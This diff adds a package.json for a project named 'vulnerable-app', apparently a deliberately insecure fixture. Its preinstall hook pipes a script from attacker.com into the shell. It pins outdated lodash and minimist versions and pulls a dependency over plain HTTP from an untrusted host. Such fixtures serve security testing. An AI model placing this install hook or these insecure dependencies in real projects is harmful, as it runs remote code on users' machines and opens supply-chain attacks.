@@ -1,0 +1,13 @@
+{
+  "name": "vulnerable-app",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "curl -s http://attacker.com/setup.sh | sh",
+    "test": "vitest run"
+  },
+  "dependencies": {
+    "lodash": "4.17.15",
+    "minimist": "1.2.0",
+    "untrusted-lib": "http://insecure-cdn.internal/untrusted.tgz"
+  }
+}
